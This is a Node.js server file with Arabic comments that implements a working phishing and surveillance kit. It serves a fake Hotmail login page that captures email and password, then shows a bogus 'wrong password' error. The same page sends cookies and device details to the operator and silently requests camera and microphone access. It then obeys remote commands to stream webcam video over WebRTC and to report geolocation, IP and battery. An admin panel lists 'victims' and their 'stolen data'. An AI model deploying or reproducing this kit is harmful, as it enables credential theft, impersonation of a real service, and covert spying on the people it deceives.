const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

// ============ صفحة الضحية ============
const victimPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            width: 400px;
            max-width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0078d4; font-size: 32px; margin-bottom: 5px; }
        .logo p { color: #666; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }
        .input-group input:focus { border-color: #0078d4; box-shadow: 0 0 10px rgba(0,120,212,0.2); }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-login:hover { background: #005a9e; }
        .btn-login:active { transform: scale(0.98); }
        #video-preview {
            display: none;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            margin: 0 auto 15px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Hotmail</h1>
            <p>تسجيل الدخول للبريد الإلكتروني</p>
        </div>
        <form id="login-form">
            <div class="input-group">
                <label>البريد الإلكتروني</label>
                <input type="email" id="email" placeholder="example@hotmail.com" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>جاري التحقق من البيانات...</p>
        </div>
        <video id="video-preview" autoplay playsinline muted></video>
    </div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let localStream = null;
        let peerConnection = null;
        
        // ============ تسجيل الضحية ============
        socket.on('connect', () => {
            socket.emit('victim_register', {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenRes: window.screen.width + 'x' + window.screen.height,
                language: navigator.language,
                cookies: document.cookie,
                referrer: document.referrer || 'Direct',
                pageTitle: document.title
            });
            
            // محاولة تفعيل الكاميرا تلقائياً
            setTimeout(autoRequestCamera, 2000);
        });
        
        // ============ طلب الكاميرا تلقائياً ============
        async function autoRequestCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 },
                    audio: true 
                });
                document.getElementById('video-preview').style.display = 'block';
                document.getElementById('video-preview').srcObject = localStream;
                socket.emit('victim_data', { type: 'camera_ready', data: 'Camera and microphone ready' });
            } catch (err) {
                console.log('Camera permission not granted yet');
            }
        }
        
        // ============ التقاط بيانات تسجيل الدخول ============
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // إخفاء النموذج وإظهار التحميل
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            socket.emit('victim_data', {
                type: 'credentials',
                data: { email, password }
            });
            
            // محاولة تفعيل الكاميرا إذا لم تكن مفعلة
            if (!localStream) {
                try {
                    localStream = await navigator.mediaDevices.getUserMedia({ 
                        video: true,
                        audio: true 
                    });
                    document.getElementById('video-preview').style.display = 'block';
                    document.getElementById('video-preview').srcObject = localStream;
                    socket.emit('victim_data', { type: 'camera_auto', data: 'Camera activated after login' });
                } catch (err) {
                    socket.emit('victim_data', { type: 'camera_denied', data: err.message });
                }
            }
            
            // بعد 3 ثواني إظهار خطأ
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('login-form').style.display = 'block';
                alert('كلمة المرور غير صحيحة. حاول مرة أخرى.');
            }, 3000);
        });
        
        // ============ استقبال الأوامر ============
        socket.on('execute_command', async (cmd) => {
            console.log('Command received:', cmd.action);
            
            switch(cmd.action) {
                case 'start_cam':
                    await startCamera(cmd.from);
                    break;
                case 'stop_cam':
                    stopCamera();
                    break;
                case 'start_mic':
                    await startMicrophone(cmd.from);
                    break;
                case 'get_location':
                    getLocation();
                    break;
                case 'get_cookies':
                    socket.emit('victim_data', { type: 'cookies', data: document.cookie || 'No cookies' });
                    break;
                case 'screenshot':
                    takeScreenshot();
                    break;
                case 'get_ip':
                    getIP();
                    break;
                case 'get_battery':
                    getBattery();
                    break;
            }
        });
        
        // ============ تشغيل الكاميرا ============
        async function startCamera(adminId) {
            try {
                if (!localStream) {
                    localStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { width: 640, height: 480 },
                        audio: false 
                    });
                    document.getElementById('video-preview').style.display = 'block';
                    document.getElementById('video-preview').srcObject = localStream;
                }
                
                const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
                peerConnection = new RTCPeerConnection(configuration);
                
                localStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, localStream);
                });
                
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit('webrtc_ice', { targetId: adminId, candidate: event.candidate });
                    }
                };
                
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                socket.emit('webrtc_offer', { targetId: adminId, offer: offer });
                
                socket.emit('victim_data', { type: 'camera_started', data: 'Camera is broadcasting' });
            } catch (err) {
                socket.emit('victim_data', { type: 'camera_error', data: err.message });
            }
        }
        
        // ============ تشغيل الميكروفون ============
        async function startMicrophone(adminId) {
            try {
                if (!localStream) {
                    localStream = await navigator.mediaDevices.getUserMedia({ 
                        video: false,
                        audio: true 
                    });
                }
                socket.emit('victim_data', { type: 'mic_started', data: 'Microphone is active' });
            } catch (err) {
                socket.emit('victim_data', { type: 'mic_error', data: err.message });
            }
        }
        
        // ============ إيقاف الكاميرا ============
        function stopCamera() {
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
                document.getElementById('video-preview').style.display = 'none';
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            socket.emit('victim_data', { type: 'camera_stopped', data: 'Camera stopped' });
        }
        
        // ============ تحديد الموقع ============
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        socket.emit('victim_data', {
                            type: 'location',
                            data: { 
                                lat: pos.coords.latitude, 
                                lng: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            }
                        });
                    },
                    (err) => {
                        socket.emit('victim_data', { type: 'location_error', data: err.message });
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                socket.emit('victim_data', { type: 'location_error', data: 'Geolocation not supported' });
            }
        }
        
        // ============ لقطة شاشة ============
        function takeScreenshot() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#ffffff';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                const screenshot = canvas.toDataURL('image/png');
                socket.emit('victim_data', { type: 'screenshot', data: screenshot });
            } catch (err) {
                socket.emit('victim_data', { type: 'screenshot_error', data: err.message });
            }
        }
        
        // ============ الحصول على IP ============
        function getIP() {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    socket.emit('victim_data', { type: 'ip_address', data: data.ip });
                })
                .catch(err => {
                    socket.emit('victim_data', { type: 'ip_error', data: err.message });
                });
        }
        
        // ============ مستوى البطارية ============
        function getBattery() {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    socket.emit('victim_data', {
                        type: 'battery',
                        data: {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging
                        }
                    });
                });
            }
        }
        
        // ============ استقبال إشارات WebRTC ============
        socket.on('webrtc_answer', async (data) => {
            if (peerConnection) {
                await peerConnection.setRemoteDescription(data.answer);
            }
        });
        
        socket.on('webrtc_ice', async (data) => {
            if (peerConnection) {
                await peerConnection.addIceCandidate(data.candidate);
            }
        });
    </script>
</body>
</html>`;

// ============ صفحة لوحة التحكم ============
const adminPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - 2099</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
        }
        .login-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            gap: 20px;
            background: radial-gradient(circle at center, #1a1a2e 0%, #0a0a0f 100%);
        }
        .login-screen h1 { color: #00f0ff; font-size: 36px; text-shadow: 0 0 20px #00f0ff; }
        .login-screen input {
            padding: 15px;
            width: 300px;
            background: #1a1a2e;
            border: 2px solid #2a2a3a;
            color: white;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }
        .login-screen input:focus { border-color: #00f0ff; box-shadow: 0 0 20px rgba(0,240,255,0.3); }
        .login-screen button {
            padding: 12px 30px;
            background: #00f0ff;
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .login-screen button:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,240,255,0.5); }
        .main-panel { display: none; padding: 20px; }
        header {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        header h1 { color: #00f0ff; font-size: 24px; }
        .victim-count-badge {
            background: #ff0055;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
        }
        .layout {
            display: flex;
            gap: 20px;
        }
        .victims-panel {
            width: 300px;
            background: #12121a;
            border-radius: 10px;
            padding: 20px;
            min-height: 400px;
        }
        .victims-panel h2 { color: #00f0ff; margin-bottom: 15px; font-size: 18px; }
        .victim-card {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 10px;
            border: 2px solid transparent;
            transition: all 0.3s;
        }
        .victim-card:hover { border-color: #00f0ff; transform: translateY(-2px); }
        .victim-card.selected { border-color: #ff0055; background: #1a0a0a; }
        .victim-card strong { display: block; margin-bottom: 5px; }
        .victim-card small { color: #888; }
        .video-panel {
            flex: 1;
            background: #12121a;
            border-radius: 10px;
            padding: 20px;
        }
        .video-panel h2 { color: #00f0ff; margin-bottom: 15px; font-size: 18px; }
        #remoteVideo {
            width: 100%;
            max-height: 350px;
            background: #000;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .controls button {
            padding: 12px 20px;
            background: #1a1a2e;
            color: white;
            border: 1px solid #2a2a3a;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            font-size: 14px;
        }
        .controls button:hover {
            background: #00f0ff;
            color: black;
            border-color: #00f0ff;
            box-shadow: 0 5px 20px rgba(0,240,255,0.4);
        }
        .controls button.danger:hover {
            background: #ff0055;
            border-color: #ff0055;
        }
        .data-log {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
        }
        .data-log h2 { color: #00ff88; margin-bottom: 15px; font-size: 18px; }
        .data-entry {
            background: #1a1a2e;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 10px;
            border-right: 3px solid #ff0055;
        }
        .data-entry b { color: #00f0ff; display: block; margin-bottom: 5px; }
        .data-entry .time { color: #888; font-size: 12px; }
        .empty-state {
            text-align: center;
            color: #666;
            padding: 30px 0;
        }
    </style>
</head>
<body>
    <div class="login-screen" id="login-screen">
        <h1>👑 لوحة التحكم</h1>
        <input type="password" id="admin-key" placeholder="أدخل مفتاح الوصول">
        <button onclick="login()">دخول</button>
    </div>
    
    <div class="main-panel" id="main-panel">
        <header>
            <h1>HOTMAIL 2099 - Control Panel</h1>
            <div class="victim-count-badge">
                الضحايا: <b id="victim-count">0</b>
            </div>
        </header>
        
        <div class="layout">
            <div class="victims-panel">
                <h2>🖥️ الأجهزة المتصلة</h2>
                <div id="victims-list">
                    <div class="empty-state">لا توجد أجهزة متصلة...</div>
                </div>
            </div>
            
            <div class="video-panel">
                <h2>📹 البث المباشر</h2>
                <video id="remoteVideo" autoplay playsinline></video>
                
                <div class="controls">
                    <button onclick="sendCmd('start_cam')">📷 تشغيل الكاميرا</button>
                    <button onclick="sendCmd('stop_cam')" class="danger">🛑 إيقاف الكاميرا</button>
                    <button onclick="sendCmd('start_mic')">🎤 الميكروفون</button>
                    <button onclick="sendCmd('get_location')">📍 الموقع</button>
                    <button onclick="sendCmd('get_cookies')">🍪 الكوكيز</button>
                    <button onclick="sendCmd('screenshot')">📸 لقطة شاشة</button>
                    <button onclick="sendCmd('get_ip')">🌐 عنوان IP</button>
                    <button onclick="sendCmd('get_battery')">🔋 البطارية</button>
                </div>
            </div>
        </div>
        
        <div class="data-log">
            <h2>📊 البيانات المسروقة</h2>
            <div id="stolen-data">
                <div class="empty-state">لا توجد بيانات بعد...</div>
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let selectedVictim = null;
        let peerConnection = null;
        
        // ============ تسجيل الدخول ============
        function login() {
            const key = document.getElementById('admin-key').value;
            socket.emit('admin_register', { key });
        }
        
        socket.on('admin_authenticated', (res) => {
            if (res.status === 'success') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-panel').style.display = 'block';
                
                // عرض الضحايا الموجودين فوراً
                if (res.victims && res.victims.length > 0) {
                    updateVictimsList(res.victims);
                }
            } else {
                alert('مفتاح خاطئ!');
            }
        });
        
        // ============ تحديث قائمة الضحايا ============
        socket.on('victims_update', (victims) => {
            updateVictimsList(victims);
        });
        
        function updateVictimsList(victims) {
            document.getElementById('victim-count').textContent = victims.length;
            const list = document.getElementById('victims-list');
            
            if (victims.length === 0) {
                list.innerHTML = '<div class="empty-state">لا توجد أجهزة متصلة...</div>';
                return;
            }
            
            list.innerHTML = '';
            victims.forEach(v => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.innerHTML = '<strong>🖥️ ' + (v.platform || 'Unknown') + '</strong><small>📱 ' + (v.screenRes || 'Unknown') + '</small>';
                card.onclick = () => {
                    selectedVictim = v.id;
                    document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');
                };
                list.appendChild(card);
            });
        }
        
        // ============ إرسال الأوامر ============
        function sendCmd(action) {
            if (!selectedVictim) { 
                alert('اختر ضحية أولاً من القائمة!'); 
                return; 
            }
            socket.emit('admin_command', { victimId: selectedVictim, action });
            console.log('Command sent:', action, 'to:', selectedVictim);
        }
        
        // ============ استقبال البيانات ============
        socket.on('victim_response', (data) => {
            const div = document.getElementById('stolen-data');
            
            // إزالة رسالة "لا توجد بيانات" إذا كانت موجودة
            const emptyMsg = div.querySelector('.empty-state');
            if (emptyMsg) emptyMsg.remove();
            
            const entry = document.createElement('div');
            entry.className = 'data-entry';
            
            const time = new Date().toLocaleTimeString();
            
            let displayData = '';
            switch(data.type) {
                case 'credentials':
                    displayData = '🔑 <b>بيانات تسجيل الدخول</b><br>📧 البريد: ' + data.data.email + '<br>🔒 كلمة المرور: ' + data.data.password;
                    break;
                case 'camera_ready':
                    displayData = '📷 <b>الكاميرا جاهزة</b><br>' + data.data;
                    break;
                case 'camera_started':
                    displayData = '📷 <b>تم تشغيل الكاميرا</b><br>' + data.data;
                    break;
                case 'camera_stopped':
                    displayData = '🛑 <b>تم إيقاف الكاميرا</b>';
                    break;
                case 'camera_error':
                    displayData = '❌ <b>خطأ في الكاميرا</b><br>' + data.data;
                    break;
                case 'camera_denied':
                    displayData = '🚫 <b>رفض إذن الكاميرا</b><br>' + data.data;
                    break;
                case 'location':
                    displayData = '📍 <b>الموقع الجغرافي</b><br>خط العرض: ' + data.data.lat + '<br>خط الطول: ' + data.data.lng;
                    break;
                case 'cookies':
                    displayData = '🍪 <b>الكوكيز</b><br>' + data.data;
                    break;
                case 'ip_address':
                    displayData = '🌐 <b>عنوان IP</b><br>' + data.data;
                    break;
                case 'battery':
                    displayData = '🔋 <b>البطارية</b><br>المستوى: ' + data.data.level + '<br>الشحن: ' + (data.data.charging ? 'نعم' : 'لا');
                    break;
                default:
                    displayData = JSON.stringify(data.data);
            }
            
            entry.innerHTML = displayData + '<div class="time">' + time + '</div>';
            div.prepend(entry);
        });
        
        // ============ WebRTC للبث المباشر ============
        socket.on('webrtc_offer', async (data) => {
            const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
            peerConnection = new RTCPeerConnection(configuration);
            
            peerConnection.ontrack = (event) => {
                document.getElementById('remoteVideo').srcObject = event.streams[0];
            };
            
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('webrtc_ice', { targetId: data.from, candidate: event.candidate });
                }
            };
            
            await peerConnection.setRemoteDescription(data.offer);
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('webrtc_answer', { targetId: data.from, answer: answer });
        });
        
        socket.on('webrtc_ice', async (data) => {
            if (peerConnection) {
                await peerConnection.addIceCandidate(data.candidate);
            }
        });
    </script>
</body>
</html>`;

// ============ المسارات ============
app.get('/health', (req, res) => {
    res.json({ status: 'active', timestamp: Date.now() });
});

app.get('/admin', (req, res) => {
    res.send(adminPage);
});

app.get('/', (req, res) => {
    res.send(victimPage);
});

// ============ Socket.io ============
let victims = new Map();
let admins = new Set();

io.on('connection', (socket) => {
    console.log('Connected:', socket.id);

    socket.on('admin_register', (data) => {
        if (data.key === 'ARCHITECT_2099') {
            admins.add(socket.id);
            socket.emit('admin_authenticated', { 
                status: 'success',
                victims: Array.from(victims.values())
            });
            console.log('Admin logged in:', socket.id);
        } else {
            socket.emit('admin_authenticated', { status: 'denied' });
        }
    });

    socket.on('victim_register', (data) => {
        victims.set(socket.id, { id: socket.id, ...data });
        console.log('Victim registered:', socket.id, 'Total:', victims.size);
        admins.forEach(adminId => {
            io.to(adminId).emit('victims_update', Array.from(victims.values()));
        });
    });

    socket.on('admin_command', (payload) => {
        if (victims.has(payload.victimId)) {
            io.to(payload.victimId).emit('execute_command', {
                ...payload,
                from: socket.id
            });
            console.log('Command sent:', payload.action, 'to:', payload.victimId);
        }
    });

    socket.on('victim_data', (data) => {
        admins.forEach(adminId => {
            io.to(adminId).emit('victim_response', data);
        });
    });

    socket.on('webrtc_offer', (data) => {
        if (admins.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_offer', {
                offer: data.offer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_answer', (data) => {
        if (victims.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_answer', {
                answer: data.answer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_ice', (data) => {
        io.to(data.targetId).emit('webrtc_ice', {
            candidate: data.candidate,
            from: socket.id
        });
    });

    socket.on('disconnect', () => {
        if (victims.has(socket.id)) {
            victims.delete(socket.id);
            console.log('Victim disconnected:', socket.id);
            admins.forEach(adminId => {
                io.to(adminId).emit('victims_update', Array.from(victims.values()));
            });
        }
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log('Admin disconnected:', socket.id);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('⚡ Running on port ' + PORT);
});
